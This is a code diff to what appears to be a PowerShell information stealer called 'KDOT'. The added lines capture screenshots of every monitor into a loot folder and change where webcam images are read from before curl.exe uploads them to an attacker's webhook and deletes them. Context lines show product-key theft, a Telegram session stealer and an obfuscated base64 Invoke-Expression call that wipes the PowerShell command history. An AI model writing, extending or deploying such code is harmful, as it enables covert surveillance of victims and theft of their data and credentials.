@@ -230,7 +230,6 @@ function Invoke-ANTITOTAL {
             ""
         }
     }
-    [ProcessUtility]::MakeProcessCritical()
     Invoke-TASKS
 }
 
@@ -386,6 +385,21 @@ function Backup-Data {
         }
     }
     Get-ProductKey > $folder_general\productkey.txt
+	
+	# Desktop screenshot
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    $screens = [Windows.Forms.Screen]::AllScreens
+    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $bmp.Save("$folder_general\screenshot.png")
+    $graphics.Dispose()
+    $bmp.Dispose()
 
     # All Messaging Sessions
     function telegramstealer {
@@ -775,11 +789,11 @@ function Backup-Data {
     }
     Get-WebcamIMG
 	
-    $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
+    $items = Get-ChildItem -Path "$env:APPDATA\KDOT" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
-        Remove-Item -Path "$folder_general\$name" -Force
+        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\KDOT\$name\`"" $webhook | out-null
+        Remove-Item -Path "$env:APPDATA\KDOT\$name" -Force
     }
 	
 	Function Invoke-GrabFiles {
@@ -922,7 +936,6 @@ if (INVOKE-AC -eq $true) {
     if ($debug) {
         Read-Host "Press Enter to continue..."
     } else {
-        [ProcessUtility]::MakeProcessKillable()
     }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
